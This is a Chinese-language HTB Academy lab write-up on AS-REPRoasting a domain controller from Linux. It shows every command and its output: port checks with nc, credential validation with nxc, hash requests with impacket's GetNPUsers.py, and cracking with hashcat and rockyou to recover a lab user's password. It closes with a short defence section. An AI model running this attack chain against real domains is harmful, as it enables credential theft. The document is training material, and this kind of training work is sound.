# AS-REPRoasting from Linux — Writeup

> HTB Academy / Kerberos Attacks 模組
> 目標：`10.129.205.35` (ACADEMY-KERBATTCK-2-DC01) — **這次直接是網域控制站 (DC)**
> 授權帳號：`INLANEFREIGHT\htb-student : HTB_@cademy_stdnt!`
> 日期：2026-11-17

---

## 答案

| 題目 | 答案 |
|------|------|
| q1 — Amber（已停用 pre-authentication）的密碼 | **`teddybear`**（帳號 `amber.smith`） |

AS-REP hash（hashcat mode 18200）：

```
$krb5asrep$23$amber.smith@INLANEFREIGHT.LOCAL:c2cb3f66...afcfd5
```

---

## 0. 背景：從 Linux 打 AS-REPRoasting

AS-REPRoasting 針對設了 **`DONT_REQ_PREAUTH`（UAC bit `0x400000`）** 的帳號：
KDC 不驗證 pre-authentication，任何人不用密碼就能向 KDC（埠 88）要到該帳號的
AS-REP，裡面有一段用帳號密碼雜湊加密的資料 → 離線破解拿明文。

**與上一題（workstation WS01）最大的差別**：這題目標直接是 DC，**我的 Linux
主機碰得到埠 88 / 389**，所以不需要 Rubeus、不需要繞 double-hop，直接用
`impacket-GetNPUsers` 一條龍搞定。

---

## 1. 偵察 — 確認是 DC、相關埠有開

```bash
for p in 88 389 445; do nc -zv -w3 10.129.205.35 $p; done
```

```
88  (Kerberos) → open
389 (LDAP)     → open
445 (SMB)      → open
```

確認網域名稱與憑證：

```bash
nxc smb 10.129.205.35 -u htb-student -p 'HTB_@cademy_stdnt!'
```

```
SMB  10.129.205.35  445  DC01  (domain:INLANEFREIGHT.LOCAL) (signing:True) (DC:True)
SMB  [+] INLANEFREIGHT.LOCAL\htb-student:HTB_@cademy_stdnt!
```

→ 目標 `DC01`，網域 `INLANEFREIGHT.LOCAL`，`htb-student` 憑證有效。
`(DC:True)` 確認是網域控制站，LDAP/Kerberos 都能直接問它。

---

## 2. 直接 AS-REProast（Linux / impacket）

有一組有效網域帳號（`htb-student`），用 `-request` 讓 GetNPUsers **列舉並直接
索取** 所有 pre-auth 停用帳號的 AS-REP hash：

```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/htb-student:'HTB_@cademy_stdnt!' \
  -request -format hashcat -dc-ip 10.129.205.35 \
  -outputfile /tmp/dc_asrep.txt
```

> 本機工具是 `GetNPUsers.py`（不是 `impacket-GetNPUsers`，視安裝而定，二擇一）。

輸出列出三個帳號，重點是 amber：

```
Name          ... UAC      ...
amber.smith   ... 0x410200
```

`UAC 0x410200` 含 bit `0x400000`（DONT_REQ_PREAUTH）→ 確認 pre-auth 已停用。
拿到的 hash：

```
$krb5asrep$23$amber.smith@INLANEFREIGHT.LOCAL:c2cb3f66...afcfd5
$krb5asrep$23$jenna.smith@INLANEFREIGHT.LOCAL:...
$krb5asrep$23$carole.rose@INLANEFREIGHT.LOCAL:...
```

> 補充：若**沒有**任何有效帳號，也可用 `-usersfile users.txt`（無密碼）純靠
> 使用者名單去試 AS-REQ，不需 `-request` 的前置驗證。本題有 `htb-student`，
> 直接 `-request` 最省事。

---

## 3. 離線破解

```bash
grep amber /tmp/dc_asrep.txt > /tmp/amber.hash
hashcat -m 18200 /tmp/amber.hash /usr/share/wordlists/rockyou.txt -O
```

結果：

```
$krb5asrep$23$amber.smith@INLANEFREIGHT.LOCAL:c2cb3...afcfd5:teddybear
Status...........: Cracked
```

**q1 = `teddybear`**

---

## 攻擊鏈總結

```
nc 掃 88/389/445 → 目標是 DC，Linux 直連得到
      │
      ▼
nxc smb 確認 domain=INLANEFREIGHT.LOCAL、htb-student 有效、(DC:True)
      │
      ▼
GetNPUsers.py -request（用有效帳號列舉+索取所有 pre-auth 停用帳號 AS-REP）
      │  amber.smith  UAC 0x410200
      ▼
hashcat -m 18200 + rockyou → teddybear
```

## 和上一題的對比（學習重點）

| | 上一題 (WS01 workstation) | 這題 (DC01) |
|---|---|---|
| 目標角色 | 網域成員工作站，DC 碰不到 | 直接是網域控制站 |
| 埠 88/389 | 關閉（對我） | 開放 |
| 工具 | Rubeus（在 WS01 上跑） | impacket GetNPUsers（Linux 本機） |
| 卡點 | Kerberos **double-hop**，要靠排程工作帶密碼繞過 | 無，直連即可 |

重點：**先判斷目標是不是 DC / 能不能直連埠 88**。能直連就從 Linux 用
`GetNPUsers.py -request` 最快；只能透過成員機轉送時才需要 Rubeus 並處理
double-hop。

## 防禦

- 不要給帳號設 `DONT_REQ_PREAUTH`。
- 強密碼讓離線字典破解失效（`teddybear` 這種必破）。
- 監控 Event ID 4768 中 pre-auth type 為 0 的 AS-REQ，尤其短時間大量索取。
